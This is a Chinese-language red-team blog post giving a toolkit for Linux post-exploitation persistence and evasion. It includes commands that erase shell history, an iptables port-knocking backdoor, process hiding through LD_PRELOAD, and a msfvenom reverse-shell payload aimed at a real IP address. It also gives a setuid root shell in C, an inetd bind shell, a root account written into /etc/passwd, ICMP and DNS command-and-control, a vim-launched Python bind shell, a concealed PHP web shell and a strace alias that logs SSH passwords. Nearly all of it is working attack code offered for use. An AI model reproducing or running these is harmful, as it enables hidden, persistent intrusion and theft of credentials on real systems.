+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MTA1MTUwODcuanBn?x-oss-process=image/format,png" alt="-w637"></p>
+<p>解<code>锁</code>：</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MTEwNzIxNzguanBn?x-oss-process=image/format,png" alt="-w661"></p>
+<p><strong>-w661</strong></p>
+<h3 id="隐藏历史操作命令"><a href="#隐藏历史操作命令" class="headerlink" title="隐藏历史操作命令"></a>隐藏历史操作命令</h3><p>拿到shell以后，开始<code>无痕模式</code>，禁用命令历史记录功能。</p>
+<pre><code>set +o history</code></pre><p>恢复</p>
+<pre><code>set -o history</code></pre><pre><code>history</code></pre><p>可以看到恢复以后可以正常记录历史命令</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MjAwNzA1MjEuanBn?x-oss-process=image/format,png" alt="-w463"></p>
+<p><strong>-w463</strong></p>
+<h3 id="删除自己的历史命令"><a href="#删除自己的历史命令" class="headerlink" title="删除自己的历史命令"></a>删除自己的历史命令</h3><p>删除指定的历史记录</p>
+<pre><code>sed -i &quot;100,$d&quot; .bash_history</code></pre><p>删除100行以后的操作命令</p>
+<p>demo</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3MjQ1ODk2MzUuanBn?x-oss-process=image/format,png" alt="-w636"></p>
+<p><strong>-w636</strong></p>
+<h3 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h3><h4 id="通过SSLH在同一端口上共享SSH与HTTPS"><a href="#通过SSLH在同一端口上共享SSH与HTTPS" class="headerlink" title="通过SSLH在同一端口上共享SSH与HTTPS"></a>通过SSLH在同一端口上共享SSH与HTTPS</h4><p>Linux上在同一端口上共享SSH与HTTPS的工具：SSLH</p>
+<pre><code>安装SSLH
+apt install sslh
+ 配置SSLH
+ 编辑 SSLH 配置文件：
+ sudo vi /etc/default/sslh
+ 1、找到下列行：Run=no  将其修改为：Run=yes
+ 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443
+  DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;
+  service sslh start</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3NDM1MjYzMDYuanBn?x-oss-process=image/format,png" alt="-w1511"></p>
+<p><strong>-w1511</strong></p>
+<p>测试：</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3NDQyMDk2NTcuanBn?x-oss-process=image/format,png" alt="-w1102"></p>
+<p><strong>-w1102</strong></p>
+<p>环境是docker，444对应的是靶机的443<br>测试成功</p>
+<h4 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h4><pre><code># 端口复用链
+iptables -t nat -N LETMEIN
+# 端口复用规则
+iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
+# 开启开关
+iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT
+# 关闭开关
+iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT
+# let&#39;s do it
+iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</code></pre><p>exploit</p>
+<p>TIPS：docker测试的时候</p>
+<pre><code>docker run -ti --privileged ubuntu:latest</code></pre><p>–privileged这个参数一定要加上</p>
+<pre><code>#开启复用
+echo threathuntercoming | socat - tcp:192.168.19.170:80
+#ssh使用80端口进行登录
+ssh -p 80 root@192.168.19.170:
+#关闭复用
+echo threathunterleaving | socat - tcp:192.168.19.170:80</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3ODgzNzA3MTIuanBn?x-oss-process=image/format,png" alt="-w903"></p>
+<p><strong>-w903</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI3ODgyNTY3MjQuanBn?x-oss-process=image/format,png" alt="-w1125"></p>
+<p><strong>-w1125</strong></p>
+<p>另外还有icmp的利用方式<br>原文在<br>远程遥控 IPTables 进行端口复用<br><a href="https://www.freebuf.com/articles/network/137683.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/137683.html</a></p>
+<h3 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h3><h4 id="libprocesshider"><a href="#libprocesshider" class="headerlink" title="libprocesshider"></a>libprocesshider</h4><p>github上的一个项目，项目地址<br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a></p>
+<pre><code>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下：
+
+# 下载程序编译
+git clone https://github.com/gianlucaborello/libprocesshider.git
+apt-get install  gcc automake autoconf libtool make
+cd libprocesshider/ &amp;&amp; make
+# 移动文件到/usr/local/lib/目录下
+cp libprocesshider.so /usr/local/lib/
+# 把它加载到全局动态连接局
+echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload或者export LD_PRELOAD=/usr/local/lib/libprocesshider.so</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MDMyMDc4ODguanBn?x-oss-process=image/format,png" alt="-w1083"></p>
+<p><strong>-w1083</strong></p>
+<p>运行</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTYzNzM4OTUuanBn?x-oss-process=image/format,png" alt="-w821"></p>
+<p><strong>-w821</strong></p>
+<p>效果</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTY0OTYzNDAuanBn?x-oss-process=image/format,png" alt="-w1112"></p>
+<p><strong>-w1112</strong></p>
+<p>具体的进程名字，自己可以在c文件里面设置</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTY4NTI1ODkuanBn?x-oss-process=image/format,png" alt="-w732"></p>
+<p><strong>-w732</strong></p>
+<p>克制它的工具</p>
+<pre><code>unhide  proc</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODI4MTc0Mzc4OTQuanBn?x-oss-process=image/format,png" alt="-w790"></p>
+<p><strong>-w790</strong></p>
+<h4 id="linux-inject"><a href="#linux-inject" class="headerlink" title="linux-inject"></a>linux-inject</h4><p>linux-inject是用于将共享对象注入Linux进程的工具</p>
+<p>项目地址： <a href="https://github.com/gaffe23/linux-inject.git" target="_blank" rel="noopener">https://github.com/gaffe23/linux-inject.git</a></p>
+<pre><code># 下载程序编译
+git clone https://github.com/gaffe23/linux-inject.git
+cd linux-inject &amp;&amp; make
+# 测试进程
+./sample-target
+# 进程注入
+./inject -n sample-target sample-library.so</code></pre><p>先编译自己定义的c文件<br>安装依赖包</p>
+<pre><code>sudo apt-get purge libc6-dev
+sudo apt-get install libc6-dev
+sudo apt-get install libc6-dev-i386
+sudo apt-get install clang</code></pre><pre><code>#include &lt;stdio.h&gt;
+__attribute__((constructor))void hello() {    puts(&quot;Hello world!&quot;);}</code></pre><p>生成so文件</p>
+<pre><code>gcc -shared -fPIC -o libwing.so hello.c</code></pre><p>先执行测试的文件</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMzE0OTA0MzAuanBn?x-oss-process=image/format,png" alt="-w787"></p>
+<p><strong>-w787</strong></p>
+<p>然后注入自定义的so文件</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMzEzNjA3NTcuanBn?x-oss-process=image/format,png" alt="-w868"></p>
+<p><strong>-w868</strong></p>
+<p>注入成功。</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODMwMjgyNjk0MTkuanBn?x-oss-process=image/format,png" alt="-w610"></p>
+<p><strong>-w610</strong></p>
+<h2 id="Vegile"><a href="#Vegile" class="headerlink" title="Vegile"></a>Vegile</h2><p>在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。</p>
+<p>Vegile是一个用来隐藏自己的进程的工具，即使进程被杀，又会重新启动。</p>
+<p>先生成一个msf后门</p>
+<p>bash</p>
+<pre class=" language-bash"><code class="language-bash">msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST<span class="token operator">=</span>149.129.72.186  LPORT<span class="token operator">=</span>8000  -f elf -o /var/www/html/Wing_Backdoor2</code></pre>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MDQ2NjY3MTguanBn?x-oss-process=image/format,png" alt="-w1653"></p>
+<p><strong>-w1653</strong></p>
+<p>msf开启监听</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MTI1NjkwODAuanBn?x-oss-process=image/format,png" alt="-w1250"></p>
+<p><strong>-w1250</strong></p>
+<p>执行</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MTE1MDM3MjEuanBn?x-oss-process=image/format,png" alt="-w864"></p>
+<p><strong>-w864</strong></p>
+<p>第一种是进程注入的方式<br>第二种是进程被杀还可以继续反弹shell</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2MjcyMzUxNjcuanBn?x-oss-process=image/format,png" alt="-w915"></p>
+<p><strong>-w915</strong></p>
+<p>由于依赖的原因，第二种有点小bug</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM2Mjc1NDQ0MDcuanBn?x-oss-process=image/format,png" alt="-w994"></p>
+<p><strong>-w994</strong></p>
+<p>测试成功。</p>
+<h2 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h2><p>Cymothoa是一个轻量级的后门，也是使用进程注入的方法。</p>
+<p>下载地址：<br><a href="https://sourceforge.net/projects/cymothoa/files/latest/download" target="_blank" rel="noopener">https://sourceforge.net/projects/cymothoa/files/latest/download</a></p>
+<p>编译好的地址<br><a href="https://github.com/BlackArch/cymothoa-bin" target="_blank" rel="noopener">https://github.com/BlackArch/cymothoa-bin</a></p>
+<p>使用方法</p>
+<pre><code>./cymothoa -S</code></pre><p>查看可用的shellcode</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5MjUzMjY2MzMuanBn?x-oss-process=image/format,png" alt="-w746"></p>
+<p><strong>-w746</strong></p>
+<p>只要反弹shell的功能，0即可</p>
+<p>查找到bash的pid，因为bash进程一般都是存在的</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5MjY1MzgxNDUuanBn?x-oss-process=image/format,png" alt="-w530"></p>
+<p><strong>-w530</strong></p>
+<pre><code>./cymothoa -p pid -s 1 -y port</code></pre><p>不太可控，我在kali测试会把进程弄死掉，实际环境不建议使用。</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5NDIzNzkxODEuanBn?x-oss-process=image/format,png" alt="-w668"></p>
+<p><strong>-w668</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODM5NDI3NTcwNzQuanBn?x-oss-process=image/format,png" alt="-w677"></p>
+<p><strong>-w677</strong></p>
+<p>然后我msf的窗口就卡死了<br>成功的话nc可以直接连接自定义的端口，跟环境有关系。</p>
+<h2 id="Setuid-and-Setgid"><a href="#Setuid-and-Setgid" class="headerlink" title="Setuid and Setgid"></a>Setuid and Setgid</h2><p>setuid: 设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 /usr/bin/passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码.</p>
+<p>setgid: 该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组.</p>
+<p>sticky bit: 该位可以理解为防删除位. 一个文件是否可以被某用户删除， 主要取决于该文件所属的组是否对该用户具有写权限. 如果没有写权限， 则这个目录下的所有文件都不能被删除， 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件， 则可以对文件使用sticky bit位. 设置该位后， 就算用户对目录具有写权限， 也不能删除该文件.</p>
+<p>众所周知，Linux的文件权限如: 777;666等，其实只要在相应的文件上加上UID的权限，就可以用到加权限人的身份去运行这个文件。所以我们只需要将bash复制出来到另一个地方， 然后用root加上UID权限，只要用户运行此Shell就可以用用root的身份来执行任何文件了。</p>
+<p>写一个简单的后门：<br>backdoor.c</p>
+<pre><code>#include &lt;unistd.h&gt;
+void main(int argc, char *argv[])
+{
+    setuid(0);
+    setgid(0);
+    if(argc &gt; 1)
+        execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, argv[1], NULL);
+    else
+        execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+}</code></pre><p>编译：</p>
+<pre><code>gcc backdoor.c -o backdoor</code></pre><pre><code>cp backdoor /bin/</code></pre><pre><code>chmod u+s /bin/backdoor</code></pre><p>wing权限执行backdoor</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjA1NzU4MjEuanBn?x-oss-process=image/format,png" alt="-w667"></p>
+<p><strong>-w667</strong></p>
+<h2 id="inetd后门"><a href="#inetd后门" class="headerlink" title="inetd后门"></a>inetd后门</h2><p>inetd是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。 它可以为多种服务管理连接，当inetd 接到连接时，它能够确定连接所需的程序，启动相应的进程，并把socket 交给它（服务socket 会作为程序的标准输入、 输出和错误输出描述符）。</p>
+<p>安装</p>
+<pre><code>apt-get install openbsd-inetd</code></pre><p>用系统自带的服务</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjY0MTIyNzcuanBn?x-oss-process=image/format,png" alt="-w670"></p>
+<p><strong>-w670</strong></p>
+<p>配置后门</p>
+<pre><code># vi /etc/inetd.conf    
+fido  stream tcp nowait  root  /bin/bash bash -i # 当外部请求名为fido的服务时就弹shell
+
+inetd</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjY4MDU5ODUuanBn?x-oss-process=image/format,png" alt="-w492"></p>
+<p><strong>-w492</strong></p>
+<p>nc连接</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0MjgwMzEyMzEuanBn?x-oss-process=image/format,png" alt="-w652"></p>
+<p><strong>-w652</strong></p>
+<p>参考：<a href="https://klionsec.github.io/2017/10/23/inetd-backdoor/" target="_blank" rel="noopener">基于 inetd 后门的简要分析及利用</a></p>
+<h2 id="添加后门账户"><a href="#添加后门账户" class="headerlink" title="添加后门账户"></a>添加后门账户</h2><pre><code>生成密码
+perl -e &#39;print crypt(&quot;wing&quot;, &quot;AA&quot;). &quot;\n&quot;&#39;
+直接添加到passwd
+echo &quot;weblogic1:AAyx65VrBb.fI:0:0:root:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</code></pre><p>容易被检测出来，还不如直接ssh key</p>
+<h2 id="ICMP后门"><a href="#ICMP后门" class="headerlink" title="ICMP后门"></a>ICMP后门</h2><p>项目地址：<a href="https://github.com/andreafabrizi/prism" target="_blank" rel="noopener">https://github.com/andreafabrizi/prism</a><br>编译</p>
+<p>Android平台：</p>
+<pre><code>apt-get install gcc-arm-linux-gnueabi
+arm-linux-gnueabi-gcc -DSTATIC -DDETACH -DNORENAME -static -march=armv5 prism.c -o prism</code></pre><p>Linux 64bit：</p>
+<pre><code>apt-get install libc6-dev-amd64
+gcc -DDETACH -m64 -Wall -s -o prism prism.c</code></pre><p>Linux 32bit：</p>
+<pre><code>apt-get install libc6-dev-i386
+gcc -DDETACH -m32 -Wall -s -o prism prism.c</code></pre><p>查看信息:</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0NzUxNzM3NzYuanBn?x-oss-process=image/format,png" alt="-w616"></p>
+<p><strong>-w616</strong></p>
+<p>攻击机上等待后门连接</p>
+<pre><code> nc -l -p 9999</code></pre><p>发包触发后门</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0Nzc2OTI0MTYuanBn?x-oss-process=image/format,png" alt="-w1069"></p>
+<p><strong>-w1069</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0Nzc0ODExNTcuanBn?x-oss-process=image/format,png" alt="-w616"></p>
+<p><strong>-w616</strong></p>
+<h2 id="DNS后门"><a href="#DNS后门" class="headerlink" title="DNS后门"></a>DNS后门</h2><p>项目地址:<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a></p>
+<p>即使在最苛刻环境下，目标肯定也会允许DNS去解析外部或者内部的domain。<br>这就可以作为一个C2通道。command和数据夹杂在DNS查询和响应头中，所以检测起来很困难，因为命令都隐藏在正常的流量里面。</p>
+<p>我们使用<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a>来实现</p>
+<p>我mac上安装有问题，烦得很，环境麻烦，kali了。<br>算了，还是主机吧，困。。。<br>server里面要换源，建议直接指定gemfile里面的源是<a href="https://gems.ruby-china.com/" target="_blank" rel="noopener">https://gems.ruby-china.com/</a></p>
+<p>我的配置：</p>
+<pre><code># Gemfile
+# By Ron Bowes
+#
+# See LICENSE.md
+
+source &#39;https://gems.ruby-china.com/&#39;
+
+gem &#39;trollop&#39; # Commandline parsing
+gem &#39;salsa20&#39; # Encrypted connections
+gem &#39;sha3&#39;    # Message signing + key derivation
+gem &#39;ecdsa&#39;   # Used for ECDH key exchange</code></pre><pre><code>$ gem install bundler
+$ bundle install</code></pre><p>启动这玩意。</p>
+<pre><code>sudo ruby dnscat2.rb --dns &quot;domain=attck.me,host=192.168.123.192&quot; --no-cache</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-dqkWOfC6-1596077301299)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552755979068-1552755979075.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552755979068-1552755979075.png)]</a></p>
+<p><strong>title</strong></p>
+<p>然后把控制端编译好，直接make</p>
+<pre><code>./dnscat --dns server=192.168.123.192</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r35h8Mf5-1596077301300)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756235075-1552756235078.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756235075-1552756235078.png)]</a></p>
+<p><strong>title</strong></p>
+<p>这边主机运行</p>
+<pre><code>session -i 1</code></pre><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-9v0ovcC0-1596077301301)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756349556-1552756349564.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552756349556-1552756349564.png)]</a></p>
+<p><strong>title</strong></p>
+<p>我来抓包看看怎么通信的。</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-mSfe2yuL-1596077301301)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757073936-1552757073947.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757073936-1552757073947.png)]</a></p>
+<p><strong>title</strong></p>
+<p>所有命令将通过DNS流量传输</p>
+<p>我们试下powershell版本的dnscat：<br><a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></p>
+<p>language</p>
+<pre class=" language-language"><code class="language-language">Start-Dnscat2 -Domain attck.me -DNSServer 192.168.123.192</code></pre>
+<p>已经上线了</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fXFvGKYy-1596077301302)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757591988-1552757591997.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757591988-1552757591997.png)]</a></p>
+<p><strong>title</strong></p>
+<p>然后新开一个交互式shell</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-lHUephWn-1596077301302)(<a href="https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757742594-1552757742601.png)]" target="_blank" rel="noopener">https://raw.githubusercontent.com/redteamwing/wing-images/master/Wing/2019/03/17/1552757742594-1552757742601.png)]</a></p>
+<p><strong>title</strong></p>
+<p><strong>结论</strong><br>使用dnscat2有各种优点：<br>支持多个会话<br>流量加密<br>使用密钥保护MiTM攻击<br>直接从内存运行PowerShell脚本</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ0OTY4MDQ1NjMuanBn?x-oss-process=image/format,png" alt="-w739"></p>
+<p><strong>-w739</strong></p>
+<h2 id="VIM后门"><a href="#VIM后门" class="headerlink" title="VIM后门"></a>VIM后门</h2><p>先构造一个恶意脚本<br>wing.py</p>
+<pre><code>from socket import *
+import subprocess
+import os, threading, sys, time
+
+if __name__ == &quot;__main__&quot;:
+        server=socket(AF_INET,SOCK_STREAM)
+        server.bind((&#39;0.0.0.0&#39;,666))
+        server.listen(5)
+        print &#39;waiting for connect&#39;
+        talk, addr = server.accept()
+        print &#39;connect from&#39;,addr
+        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,
+                stdout=talk, stderr=talk, shell=True)</code></pre><p>前提条件就是VIM安装了python扩展,默认安装的话都有python扩展.</p>
+<p>脚本可以放到python的扩展目录</p>
+<pre><code>$(nohup vim -E -c &quot;py3file wing.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f wing.py</code></pre><p>在后台看得到vim的进程,但是看不到python的进程.</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ3OTkxMzc0NDEuanBn?x-oss-process=image/format,png" alt="-w703"></p>
+<p><strong>-w703</strong></p>
+<p>原理参考:<a href="https://github.com/jaredestroud/WOTD" target="_blank" rel="noopener">https://github.com/jaredestroud/WOTD</a></p>
+<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。</p>
+<p>它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。</p>
+<p>项目地址:<a href="https://github.com/litsand/shell" target="_blank" rel="noopener">https://github.com/litsand/shell</a><br>这是一个自动化脚本</p>
+<p>比较适用于centos,测试环境是ubuntu,暂时不复现.</p>
+<h2 id="r后门"><a href="#r后门" class="headerlink" title="\r后门"></a>\r后门</h2><pre><code>echo -e &quot;&lt;?=\`\$_POST[wing]\`?&gt;\r&lt;?=&#39;Wing  &#39;;?&gt;&quot; &gt;/var/www/html/wing.php</code></pre><p>加了<code>-e \r</code>参数之后直接查看源码,只显示后半部分</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ4MTMwOTM1OTAuanBn?x-oss-process=image/format,png" alt="-w981"></p>
+<p><strong>-w981</strong></p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODQ4MTM0NzI3OTIuanBn?x-oss-process=image/format,png" alt="-w873"></p>
+<p><strong>-w873</strong></p>
+<h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>strace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通 过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</p>
+<pre><code>ssh=&#39;strace   -o   /tmp/sshpwd-`date    &#39;+%d%h%m%s&#39;`.log  \
+ -e read,write,connect  -s2048 ssh&#39;</code></pre><p>这个也类似于alias后门</p>
